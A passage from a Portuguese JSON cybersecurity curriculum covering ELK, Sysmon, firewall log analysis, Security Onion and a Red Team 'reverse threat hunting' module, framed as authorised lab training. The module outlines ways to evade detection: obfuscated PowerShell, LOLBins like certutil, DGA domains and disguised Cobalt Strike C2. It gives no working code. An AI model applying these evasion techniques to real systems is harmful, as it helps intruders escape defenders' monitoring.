                                    "Certificados SSL auto-gerados",
                                    "Ferramenta draw.io"
                                  ],
                                  "tips": "Use ILM policies para rollover e delete antigos indices; monitore com Elastic APM.",
                                  "learningObjective": "Otimizar ELK para produção e cenários de alta disponibilidade.",
                                  "commonMistakes": [
                                    "Sem X-Pack levando a exposição pública",
                                    "Índices inchados sem rollover",
                                    "Ignorar JVM garbage collection tuning"
                                  ]
                                }
                              ],
                              "practicalExample": "Simule um host comprometido gerando logs de múltiplas tentativas de brute-force SSH (use script bash: for i in {1..50}; do logger \"Failed password for root from 192.168.1.100\"; done). Colete via Logstash, visualize no Kibana um spike em falhas, crie query KQL para alertar >20 falhas/5min, detectando atividade de hunting do Blue Team.",
                              "finalVerifications": [
                                "Logs de múltiplos hosts centralizados no Elasticsearch com índice populado.",
                                "Dashboard Kibana exibe visualizações interativas de eventos suspeitos.",
                                "Queries KQL detectam IOCs como IPs maliciosos e falhas de auth.",
                                "Alertas configurados disparam com logs simulados.",
                                "Stack acessível via browser com performance <5s/query.",
                                "Documentação de pipeline e troubleshooting disponível."
                              ],
                              "assessmentCriteria": [
                                "Precisão de parsing de logs (>95% sem _grokparsefailure).",
                                "Efetividade de detecção: queries identificam 100% de cenários simulados.",
                                "Usabilidade do dashboard: intuitivo com filtros e drill-down.",
                                "Escalabilidade: ingere 1000 logs/min sem lag.",
                                "Segurança: autenticação ativa e portas firewalld.",
                                "Documentação completa com passos de deploy."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Uso de Grok em Ruby-like patterns (conecta com linguagens scripting como Python para custom parsers).",
                                "Redes: Análise de tráfego logs correlacionados com Wireshark/netflow.",
                                "Banco de Dados: Conceitos NoSQL semelhantes a MongoDB para queries agregadas.",
                                "Estatística: Métricas de anomalias via Kibana ML jobs.",
                                "DevOps: Integração com Docker/Kubernetes para ELK deployment."
                              ],
                              "realWorldApplication": "Em um SOC de uma empresa, o ELK Stack centraliza logs de servidores, firewalls e endpoints para Blue Teams detectarem APTs em tempo real, como em incidentes de ransomware onde spikes de criptografia em logs de arquivos alertam analistas para isolamento rápido de hosts."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.2.2",
                            "name": "Monitoramento de Eventos Windows com Sysmon",
                            "description": "Instalar e configurar Sysmon para logging detalhado de eventos em ambientes Windows, analisando IOCs de resposta adversária.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalação do Sysmon em Ambiente Windows",
                                  "subSteps": [
                                    "Baixe a versão mais recente do Sysmon do site oficial da Microsoft Sysinternals.",
                                    "Verifique a integridade do arquivo baixado usando hash SHA256 para garantir autenticidade.",
                                    "Execute o Sysmon como administrador via linha de comando com o comando básico: Sysmon.exe -i.",
                                    "Confirme a instalação verificando o serviço Sysmon no Gerenciador de Serviços (services.msc).",
                                    "Reinicie o sistema para garantir que o driver Sysmon carregue corretamente."
                                  ],
                                  "verification": "Verifique se o serviço 'Sysmon' está rodando no services.msc e se eventos Sysmon aparecem no Event Viewer (Microsoft-Windows-Sysmon/Operational).",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Máquina virtual Windows 10/11",
                                    "Sysmon.exe baixado de Sysinternals",
                                    "Hash SHA256 da versão oficial"
                                  ],
                                  "tips": "Sempre execute como administrador; use uma VM isolada para testes de segurança.",
                                  "learningObjective": "Instalar Sysmon corretamente e validar sua operação inicial.",
                                  "commonMistakes": [
                                    "Executar sem privilégios de admin",
                                    "Ignorar verificação de hash",
                                    "Não reiniciar após instalação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configuração Avançada do Sysmon com Arquivo de Configuração",
                                  "subSteps": [
                                    "Obtenha ou crie um arquivo de configuração XML avançado (ex: sysmonconfig.xml) incluindo regras para ProcessCreate, NetworkConnect, FileCreate.",
                                    "Valide o XML usando o comando Sysmon.exe -c config.xml para testar sintaxe.",
                                    "Instale a configuração: Sysmon.exe -i config.xml, substituindo a configuração anterior.",
                                    "Adicione exclusões para ruído excessivo (ex: processos benignos como explorer.exe).",
                                    "Atualize a configuração dinamicamente: Sysmon.exe -c nova-config.xml."
                                  ],
                                  "verification": "Execute 'Sysmon.exe -c' para dump da configuração atual e confirme regras no Event Viewer.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Arquivo sysmonconfig.xml personalizado",
                                    "Editor de texto como Notepad++",
                                    "Documentação Sysmon Config Schema"
                                  ],
                                  "tips": "Use configurações da SwiftOnSecurity ou OUCH para inspiração; minimize logging inicial para evitar sobrecarga.",
                                  "learningObjective": "Configurar Sysmon para logging detalhado otimizado, reduzindo falsos positivos.",
                                  "commonMistakes": [
                                    "XML malformado causando falha silenciosa",
                                    "Exclusões muito amplas perdendo IOCs",
                                    "Não testar configuração antes de aplicar"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Coleta e Monitoramento Inicial de Eventos Sysmon",
                                  "subSteps": [
                                    "Abra o Event Viewer e navegue para Applications and Services Logs > Microsoft > Windows > Sysmon > Operational.",
                                    "Filtre eventos por ID (ex: Event ID 1 para ProcessCreate, 3 para NetworkConnect).",
                                    "Configure encaminhamento de logs para SIEM ou ferramenta como ELK usando Winlogbeat.",
                                    "Gere tráfego de teste: execute comandos como powershell.exe -c 'whoami' e observe logs.",
                                    "Monitore em tempo real usando PowerShell: Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'}."
                                  ],
                                  "verification": "Confirme pelo menos 10 eventos únicos gerados e visíveis no Event Viewer após testes.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Event Viewer",
                                    "PowerShell",
                                    "Winlogbeat opcional para SIEM"
                                  ],
                                  "tips": "Use filtros XPath no Event Viewer para queries eficientes; exporte logs para CSV para análise.",
                                  "learningObjective": "Coletar e visualizar logs Sysmon em tempo real para monitoramento situacional.",
                                  "commonMistakes": [
                                    "Não habilitar log Operational",
                                    "Sobrecarga de disco por logging excessivo",
                                    "Ignorar filtros de evento"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Análise de IOCs Adversários nos Logs Sysmon",
                                  "subSteps": [
                                    "Identifique IOCs comuns: hashes maliciosos em ImageLoaded (Event ID 7), conexões C2 em NetworkConnect (ID 3).",
                                    "Use ferramentas como Sysmon View ou PowerShell para query: pesquise por processos filhos suspeitos.",
                                    "Correlacione eventos: trace cadeia de processos (ex: rundll32.exe spawnando cmd.exe).",
                                    "Valide IOCs contra feeds como VirusTotal ou MITRE ATT&CK.",
                                    "Gere relatório: exporte eventos relevantes e documente timeline de ataque simulado."
                                  ],
                                  "verification": "Analise um cenário simulado (ex: LOLBAS) e identifique 5 IOCs corretamente em logs.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Sysmon View ou Event Log Explorer",
                                    "Lista de IOCs MITRE ATT&CK",
                                    "VirusTotal API chave opcional"
                                  ],
                                  "tips": "Foquem em chains de eventos; use KQL em Azure Sentinel para queries avançadas.",
                                  "learningObjective": "Analisar logs Sysmon para detectar e responder a IOCs de ameaças adversárias.",
                                  "commonMistakes": [
                                    "Foco em eventos isolados sem correlação",
                                    "Confundir benignos com maliciosos",
                                    "Não validar hashes externamente"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma VM Windows, simule um ataque usando Mimikatz (LOLBAS): execute rundll32.exe com DLL maliciosa. Configure Sysmon para capturar ProcessCreate e ImageLoad, então analise logs para detectar o processo suspeito, IP C2 e hashes, gerando um alerta SOC.",
                              "finalVerifications": [
                                "Sysmon instalado e serviço rodando sem erros.",
                                "Configuração customizada aplicada e validada.",
                                "Logs gerados para eventos de teste e visíveis no Event Viewer.",
                                "Análise de IOC simulado identifica pelo menos 3 indicadores corretos.",
                                "Relatório de análise gerado com timeline e recomendações.",
                                "Encaminhamento de logs para ferramenta externa configurado opcionalmente."
                              ],
                              "assessmentCriteria": [
                                "Precisão na instalação e configuração sem erros (90%+ cobertura de regras).",
                                "Eficiência na geração e filtragem de logs (redução de ruído >70%).",
                                "Proficiência em análise de IOCs com correlação de eventos.",
                                "Tempo de detecção em simulação <5 minutos.",
                                "Qualidade do relatório: claro, com evidências e MITRE mappings.",
                                "Conhecimento de troubleshooting comum demonstrado."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Scripts PowerShell para queries automatizadas de logs.",
                                "Redes: Análise de NetworkConnect para tráfego C2 e detecção de beacons.",
                                "Forense Digital: Coleta e preservação de evidências em investigações pós-incidente.",
                                "Inteligência de Ameaças: Mapeamento de IOCs para táticas MITRE ATT&CK.",
                                "Gerenciamento de Sistemas: Otimização de performance em logging em escala."
                              ],
                              "realWorldApplication": "Analistas SOC usam Sysmon em endpoints Windows para detecção EDR-like, hunting de ameaças persistentes (ex: APTs), e resposta a incidentes, integrando com SIEMs como Splunk ou ELK para alertas em tempo real em ambientes corporativos."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.2.3",
                            "name": "Detecção de Mudanças em Logs de Firewall",
                            "description": "Rastrear regras e logs de firewalls para identificar bloqueios ou alertas gerados por ações ofensivas no Red Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Acesso e Coleta Inicial de Logs de Firewall",
                                  "subSteps": [
                                    "Instale e configure ferramentas de monitoramento como Syslog-NG ou ELK Stack para coletar logs de firewalls (ex: pfSense, iptables).",
                                    "Defina filtros para capturar eventos relevantes: bloqueios (DROP/REJECT), alertas de tráfego suspeito e mudanças em regras.",
                                    "Estabeleça uma linha de base coletando logs por 24-48 horas em ambiente controlado sem atividade ofensiva.",
                                    "Exporte logs para formato legível (CSV/JSON) e organize em pastas por data/hora.",
                                    "Teste a coleta simulando tráfego normal para validar integridade dos logs."
                                  ],
                                  "verification": "Verifique se logs são coletados em tempo real sem perdas, usando comandos como 'tail -f /var/log/firewall.log' e confirmando pelo menos 100 entradas por hora.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Firewall virtual (ex: pfSense VM)",
                                    "Ferramentas: ELK Stack ou Splunk Free",
                                    "Ambiente lab: VirtualBox/VMware"
                                  ],
                                  "tips": [
                                    "Use certificados SSL para acesso seguro aos logs.",
                                    "Automatize coleta com scripts cron para consistência."
                                  ],
                                  "learningObjective": "Configurar coleta confiável de logs de firewall para estabelecer baseline de tráfego normal.",
                                  "commonMistakes": [
                                    "Ignorar fusos horários nos timestamps.",
                                    "Coletar logs excessivos sem filtros, causando sobrecarga."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Estrutura e Padrões Normais nos Logs",
                                  "subSteps": [
                                    "Parse os logs usando ferramentas como Logstash ou awk/grep para extrair campos chave: IP origem/destino, porta, ação (ALLOW/DENY), timestamp.",
                                    "Identifique padrões normais: tráfego interno recorrente, portas comuns (80,443), volumes típicos por IP.",
                                    "Crie visualizações com Kibana ou Grafana: gráficos de tráfego por hora, top IPs bloqueados.",
                                    "Calcule métricas baseline: taxa média de bloqueios/hora, IPs frequentes.",
                                    "Documente anomalias potenciais como picos repentinos ou portas incomuns."
                                  ],
                                  "verification": "Gere relatório com baseline documentada, incluindo 5 padrões normais identificados e visualizações salvas.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "ELK Stack instalado",
                                    "Amostra de logs baseline (pelo menos 10MB)",
                                    "Editor de texto: VS Code"
                                  ],
                                  "tips": [
                                    "Filtre por 'action=DROP' primeiro para foco em bloqueios.",
                                    "Use regex para padrões como IPs de scanners conhecidos."
                                  ],
                                  "learningObjective": "Desenvolver habilidade em parsing e baseline de logs para distinguir normal de anormal.",
                                  "commonMistakes": [
                                    "Confundir tráfego legítimo de CDN com scans.",
                                    "Não normalizar timestamps para análise temporal."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Detectar Mudanças e Alertas de Ações Ofensivas",
                                  "subSteps": [
                                    "Simule ações Red Team: nmap scan, tentativas de brute-force em portas fechadas.",
                                    "Compare logs pós-simulação com baseline: busque picos de DENY em portas incomuns (ex: 445,3389), IPs efêmeros múltiplos.",
                                    "Identifique assinaturas ofensivas: sequências rápidas de SYN floods, user-agents suspeitos em logs web-firewall.",
                                    "Correlacione eventos: bloqueio seguido de alertas IDS/IPS.",
                                    "Marque mudanças com tags: 'potencial scan', 'brute-force detectado'."
                                  ],
                                  "verification": "Liste 3-5 mudanças detectadas em simulação, com evidências de logs (IPs, timestamps, ações).",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Ferramentas Red Team: Nmap, Hydra",
                                    "Firewall com regras de alerta ativadas",
                                    "Logs de simulação salvos"
                                  ],
                                  "tips": [
                                    "Monitore em tempo real com 'tcpdump' paralelo aos logs.",
                                    "Priorize IPs com >50 tentativas/minuto."
                                  ],
                                  "learningObjective": "Identificar precisamente mudanças em logs indicativas de ações ofensivas Red Team.",
                                  "commonMistakes": [
                                    "Atribuir falsos positivos a atualizações automáticas.",
                                    "Ignorar logs de regras alteradas dinamicamente."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Correlacionar, Relatar e Automatizar Detecção",
                                  "subSteps": [
                                    "Correlacione detecções com timeline Red Team usando SIEM tools.",
                                    "Gere relatório: resumo de mudanças, impacto potencial, recomendações (ex: bloquear IP).",
                                    "Configure alertas automáticos: scripts Python para email/Slack em thresholds (ex: >10 DENY/IP).",
                                    "Teste automação com nova simulação Red Team.",
                                    "Revise e refine regras de detecção baseadas em falsos positivos."
                                  ],
                                  "verification": "Produza relatório completo e demonstre alerta automático disparado em teste.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Python/Splunk para scripts",
                                    "Templates de relatório",
                                    "Ferramentas de notificação: Slack API"
                                  ],
                                  "tips": [
                                    "Use Pandas para análise correlacionada em larga escala.",
                                    "Versione relatórios com Git para rastreabilidade."
                                  ],
                                  "learningObjective": "Integrar detecção em workflow operacional com automação e relatórios acionáveis.",
                                  "commonMistakes": [
                                    "Relatórios vagos sem evidências de logs.",
                                    "Alertas muito sensíveis gerando ruído."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de Red Team vs Blue Team, o Red Team executa 'nmap -sS -T4 target.com'. Nos logs do firewall pfSense, detecte 150+ pacotes SYN DROP de um IP efêmero em 2 minutos na porta 22, correlacione com baseline (normal: <5/min) e relate como scan stealth, sugerindo blocklist.",
                              "finalVerifications": [
                                "Detectar corretamente 80% das mudanças simuladas em logs de 1GB.",
                                "Gerar relatório com pelo menos 3 evidências por detecção.",
                                "Configurar e testar alerta automático sem falsos negativos.",
                                "Explicar 5 padrões ofensivos comuns em logs de firewall.",
                                "Diferenciar 10 falsos positivos de reais ameaças."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de mudanças: >90% acurácia em simulações.",
                                "Eficiência temporal: completar análise de 500 logs em <30min.",
                                "Qualidade do relatório: estrutura clara, evidências citadas, recomendações práticas.",
                                "Automação funcional: script alerta dispara corretamente em 3 testes.",
                                "Conhecimento teórico: explicar impacto de regras firewall em logs."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Entender protocolos TCP/UDP e estados de conexão em logs.",
                                "Análise de Dados: Uso de ELK para parsing e visualização.",
                                "Programação: Scripts Python para automação de alertas.",
                                "Inteligência de Ameaças: Correlação com IOCs de frameworks como MITRE ATT&CK."
                              ],
                              "realWorldApplication": "Em um SOC de uma empresa, detectar scans de reconnaissance de atores APT em logs de firewall, permitindo resposta rápida como isolamento de rede e mitigação antes de exploração, reduzindo tempo MTTD (Mean Time to Detect) para <1 hora."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.2.3",
                        "name": "Ferramentas SIEM e Threat Hunting para Red Team",
                        "description": "Uso de soluções SIEM adaptadas para simular e monitorar threat hunting, mantendo superioridade situacional em jogos de guerra cibernética.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.2.3.1",
                            "name": "Configuração de Security Onion para Monitoramento",
                            "description": "Montar ambiente Security Onion para correlação de eventos e detecção precoce de contra-medidas do Blue Team, conforme Blue Team Handbook.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente de Instalação",
                                  "subSteps": [
                                    "Verificar requisitos de hardware: pelo menos 8GB RAM, 100GB disco, CPU multi-core.",
                                    "Baixar a ISO mais recente do Security Onion do site oficial.",
                                    "Criar uma VM no VirtualBox/VMware ou preparar máquina física com USB bootável.",
                                    "Configurar rede bridged para captura de tráfego real.",
                                    "Desativar firewalls e SELinux no host se aplicável."
                                  ],
                                  "verification": "ISO baixada e VM/USB bootável testada com sucesso.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": "Computador com VirtualBox/VMware, ISO Security Onion, pendrive 8GB+.",
                                  "tips": "Use bridged networking para capturar tráfego da rede real desde o início.",
                                  "learningObjective": "Entender os pré-requisitos de hardware e software para uma instalação estável.",
                                  "commonMistakes": "Subestimar espaço em disco levando a falhas durante importação de logs."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar o Security Onion",
                                  "subSteps": [
                                    "Bootar da ISO e selecionar 'Install Security Onion'.",
                                    "Escolher modo Standalone para labs iniciais.",
                                    "Configurar partições: root em /, swap e /nsm para dados de rede.",
                                    "Definir senha de root e usuário admin durante setup.",
                                    "Reiniciar e aguardar serviços iniciais iniciarem."
                                  ],
                                  "verification": "Login via SSH ou console com so-allow e systemctl status so-services.",
                                  "estimatedTime": "45-60 minutos",
                                  "materials": "ISO Security Onion, conexão internet estável para atualizações.",
                                  "tips": "Anote IPs gerados para acesso futuro via navegador.",
                                  "learningObjective": "Dominar o processo de instalação automatizado do SO.",
                                  "commonMistakes": "Ignorar prompts de rede resultando em IP não acessível."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Rede e Sensores",
                                  "subSteps": [
                                    "Executar 'so-setup-nodes' para configurar interfaces de monitor (mon, mgmt).",
                                    "Definir interface de management e monitor para SPAN/mirror port.",
                                    "Habilitar sensores: Suricata para IDS, Zeek para análise de sessões.",
                                    "Aplicar políticas padrão com 'so-rule-update'.",
                                    "Reiniciar serviços afetados com 'so-restart'."
                                  ],
                                  "verification": "Verificar so-status com sensores em 'running' e tráfego sendo capturado.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": "Acesso SSH, switch com port mirroring configurado.",
                                  "tips": "Teste captura com tcpdump na interface mon antes de prosseguir.",
                                  "learningObjective": "Configurar captura de tráfego para correlação de eventos.",
                                  "commonMistakes": "Configurar interface errada como monitor, perdendo tráfego."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Ferramentas SIEM e Dashboards",
                                  "subSteps": [
                                    "Acessar SOC via https://IP:443 com credenciais admin.",
                                    "Configurar Hunt e Alerts no dashboard principal.",
                                    "Importar regras Sigma ou custom para detecção Blue Team.",
                                    "Setup Elasticsearch e Kibana para visualização de logs.",
                                    "Criar pastas de regras e ativar notificações."
                                  ],
                                  "verification": "Logs aparecendo em Kibana e alertas simulados gerados.",
                                  "estimatedTime": "45-60 minutos",
                                  "materials": "Navegador web, regras de teste do Blue Team Handbook.",
                                  "tips": "Use Playbooks do SO para automação inicial de respostas.",
                                  "learningObjective": "Integrar ferramentas para detecção precoce de contra-medidas.",
                                  "commonMistakes": "Esquecer de tunar thresholds levando a falsos positivos excessivos."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e Validar Monitoramento",
                                  "subSteps": [
                                    "Gerar tráfego de teste: nmap scan, http requests maliciosos.",
                                    "Simular ataques do Blue Team Handbook e verificar alertas.",
                                    "Analisar correlações em Squert ou Kibana.",
                                    "Exportar relatórios e ajustar tuning.",
                                    "Documentar configuração para replicação."
                                  ],
                                  "verification": "Alertas corretos gerados e visualizados em dashboards.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": "Ferramentas de teste como nmap, curl; tráfego simulado.",
                                  "tips": "Use atomic red team tests para validação realista.",
                                  "learningObjective": "Validar end-to-end para consciência situacional.",
                                  "commonMistakes": "Não testar com tráfego real, assumindo funcionamento."
                                }
                              ],
                              "practicalExample": "Em um lab de CTF, configure Security Onion em VM bridged à rede lab. Mirror tráfego de uma máquina Windows alvo de simulação de phishing. Detecte nmap scans iniciais via Suricata alerts em Kibana, correlacione com Zeek conn logs para identificar IP atacante, gerando alerta Blue Team para contra-medida.",
                              "finalVerifications": [
                                "Sensores Suricata/Zeek capturando >1000 pacotes/minuto.",
                                "Dashboards SOC acessíveis com dados em tempo real.",
                                "Alertas de teste (ex: nmap) gerados e investigáveis.",
                                "Regras custom importadas e ativas sem erros.",
                                "Export de PCAP e logs possível via so-pcap.",
                                "Sistema resiliente a reinícios com serviços auto-start."
                              ],
                              "assessmentCriteria": [
                                "Instalação completa sem erros críticos em <3h.",
                                "Captura precisa de tráfego mirrored (taxa de perda <1%).",
                                "Geração de 5+ alertas válidos em teste simulado.",
                                "Navegação fluida em Kibana/Squert para análise.",
                                "Documentação de tuning aplicada reduzindo falsos positivos.",
                                "Integração com threat hunting workflows."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Configuração de SPAN ports e tcpdump.",
                                "Linux: Gerenciamento de serviços systemd e SSH.",
                                "Análise de Logs: ELK Stack e queries DSL.",
                                "Threat Hunting: Correlação Sigma rules com MITRE ATT&CK.",
                                "Blue Team Ops: Playbooks de resposta conforme handbook."
                              ],
                              "realWorldApplication": "Em um SOC de empresa, Security Onion monitora tráfego de borda detectando C2 beacons de APTs precocemente, permitindo Blue Team isolar hosts infectados antes de lateral movement, reduzindo MTTD em 50% conforme métricas NIST."
                            },
                            "estimatedTime": "5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.2.3.2",
                            "name": "Simulação de Threat Hunting Reverso",
                            "description": "Aplicar técnicas de threat hunting do ponto de vista Red Team para prever e evadir buscas ativas por IOCs.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Técnicas de Threat Hunting Tradicional do Blue Team",
                                  "subSteps": [
                                    "Estude frameworks como MITRE ATT&CK e como hunters usam eles para mapear táticas.",
                                    "Analise queries típicas em SIEM (ex: Splunk, ELK) para detecção de IOCs como hashes, IPs e behaviors.",
                                    "Revise hipóteses de hunting: hypothesis-driven vs data-driven approaches.",
                                    "Examine ferramentas comuns: Sigma rules, YARA, Zeek para network hunting.",
                                    "Documente o ciclo de vida do threat hunting: coleta, enriquecimento, investigação."
                                  ],
                                  "verification": "Crie um diagrama do fluxo de threat hunting e liste 5 queries exemplo que detectam IOCs comuns.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Documentação MITRE ATT&CK",
                                    "Tutoriais Splunk/ELK gratuitos",
                                    "Acesso a demo SIEM online"
                                  ],
                                  "tips": "Foquem em táticas TTPs (Tactics, Techniques, Procedures) para prever buscas.",
                                  "learningObjective": "Dominar o mindset e ferramentas do Blue Team para antecipar detecções.",
                                  "commonMistakes": [
                                    "Ignorar contexto de SIEM específico",
                                    "Confundir IOCs estáticos com comportamentais",
                                    "Subestimar automação em hunting"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear IOCs Comuns e Padrões de Detecção",
                                  "subSteps": [
                                    "Liste IOCs estáticos: hashes de malware, C2 domains, user-agents suspeitos.",
                                    "Identifique IOCs comportamentais: lateral movement via SMB, privilege escalation via PowerShell.",
                                    "Analise logs típicos: Windows Event Logs, Sysmon, network flows.",
                                    "Crie uma matriz de IOCs por fase do kill chain (recon, execution, etc.).",
                                    "Priorize IOCs de alta detecção em ambientes enterprise."
                                  ],
                                  "verification": "Produza uma tabela com 20 IOCs categorizados e queries SIEM correspondentes.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "MITRE ATT&CK Navigator",
                                    "Sysmon logs samples",
                                    "Sigma rule repository"
                                  ],
                                  "tips": "Use ATT&CK Navigator para visualizar cobertura de detecção.",
                                  "learningObjective": "Identificar precisamente o que o Blue Team procura para planejar evasões.",
                                  "commonMistakes": [
                                    "Focar só em IOCs técnicos, ignorando user behaviors",
                                    "Não considerar falsos positivos comuns",
                                    "Listar IOCs obsoletos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver Estratégias de Evasão Reversas",
                                  "subSteps": [
                                    "Para cada IOC mapeado, brainstorm evasões: ofuscação de payloads, LOLBins (Living Off The Land).",
                                    "Crie técnicas custom: domain generation algorithms (DGA), traffic tunneling.",
                                    "Desenvolva scripts para automação: PowerShell obfuscado, bash one-liners.",
                                    "Teste evasões em isolation: hash fileless execution, mimic legitimate traffic.",
                                    "Avalie trade-offs: stealth vs persistence."
                                  ],
                                  "verification": "Documente 10 pares IOC-evasão com proof-of-concept pseudocódigo.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Kali Linux VM",
                                    "Cobalt Strike trial ou Empire",
                                    "Obfuscation tools como Invoke-Obfuscation"
                                  ],
                                  "tips": "Pense como um APT: priorize persistence sobre velocidade.",
                                  "learningObjective": "Gerar táticas Red Team que bypassam hunting proativo.",
                                  "commonMistakes": [
                                    "Evasões detectáveis por EDR avançado",
                                    "Não testar em múltiplos SIEMs",
                                    "Overcomplicar técnicas simples"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar e Executar Simulação de Hunting Reverso",
                                  "subSteps": [
                                    "Monte lab: victim VM (Windows) + attacker VM (Kali) + SIEM (Splunk free ou ELK).",
                                    "Execute ataques baseline com IOCs óbvios e confirme detecção.",
                                    "Aplique evasões e reexecute, monitorando logs em tempo real.",
                                    "Simule hunting ativo: execute queries manuais como Blue Team.",
                                    "Registre timelines de detecção vs evasão."
                                  ],
                                  "verification": "Grave vídeo ou logs mostrando evasão bem-sucedida em 80% dos cenários.",
                                  "estimatedTime": "5 horas",
                                  "materials": [
                                    "VirtualBox/VMware",
                                    "Splunk Free ou ELK Docker",
                                    "Sysmon + Winlogbeat"
                                  ],
                                  "tips": "Use timestamps precisos para correlacionar eventos.",
                                  "learningObjective": "Simular cenários reais de Red vs Blue hunting.",
                                  "commonMistakes": [
                                    "Lab não realista (sem EDR)",
                                    "Ignorar network segmentation",
                                    "Não resetar ambiente entre runs"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar Resultados e Iterar Estratégias",
                                  "subSteps": [
                                    "Compare logs: o que foi detectado apesar de evasões?",
                                    "Identifique gaps no Blue Team hunting e novas IOCs geradas.",
                                    "Métricas: tempo para detecção, taxa de evasão, custo computacional.",
                                    "Itere: refine 3 evasões baseadas em falhas.",
                                    "Relate lições: documento com recomendações Red Team."
                                  ],
                                  "verification": "Gere relatório com métricas e iterações comprovadas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "ELK Kibana para visualização",
                                    "Excel/Google Sheets para métricas"
                                  ],
                                  "tips": "Quantifique tudo: use scores de stealth (0-10).",
                                  "learningObjective": "Refinar habilidades através de análise pós-simulação.",
                                  "commonMistakes": [
                                    "Bias de confirmação em sucessos",
                                    "Não documentar falhas",
                                    "Parar na primeira iteração"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com Windows Server vítima monitorado por Splunk + Sysmon, execute um ataque C2 usando Cobalt Strike com payload ofuscado via LOLBins (certutil.exe). Como Red Team, evite IOCs como known C2 IPs usando DGA e HTTPS mimicando Office 365 traffic. Monitore queries de hunting como 'index=security sourcetype=sysmon EventCode=1 Image=\"*powershell*\"' e confirme evasão quando nenhum alert triggera.",
                              "finalVerifications": [
                                "Lista completa de 20+ IOCs mapeados com queries SIEM.",
                                "10 estratégias de evasão documentadas com PoCs.",
                                "Simulação em lab com >70% taxa de evasão comprovada por logs.",
                                "Relatório de análise com métricas quantitativas.",
                                "Diagrama de fluxo reverso mostrando previsão de hunts.",
                                "Auto-avaliação de gaps identificados."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude no mapeamento de IOCs (30%)",
                                "Criatividade e eficácia das estratégias de evasão (25%)",
                                "Qualidade da simulação lab e evidências (20%)",
                                "Profundidade da análise e iterações (15%)",
                                "Clareza do relatório e conexões com TTPs reais (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Queries SIEM e visualizações Kibana.",
                                "Programação: Scripts Python/Bash para automação de evasões.",
                                "Redes: Análise de tráfego com Wireshark/Zeek.",
                                "Estratégia e Psicologia: Pensamento adversário (Red vs Blue).",
                                "Ética: Regras de Engajamento em simulações cibernéticas."
                              ],
                              "realWorldApplication": "Em operações Red Team profissionais, como purple team exercises ou pentests autorizados, permite prever e contornar defesas SIEM/EDR, simulando ataques APT persistentes, melhorando a resiliência organizacional sem comprometer segurança real."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.3.3",
                    "name": "Regras de Engajamento (ROE) em Operações Ofensivas",
                    "description": "Diretrizes operacionais que definem limites e condições para ações de ataque cibernético.",
                    "individualConcepts": [
                      {
                        "id": "10.1.3.3.1",
                        "name": "Definição e Propósito das Regras de Engajamento (ROE)",
                        "description": "Conceito fundamental que define as ROE como diretrizes operacionais que estabelecem os limites autorizados, condições e restrições para o uso da força cibernética em operações ofensivas, garantindo alinhamento com objetivos estratégicos, legais e éticos em contextos de Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.3.1.1",
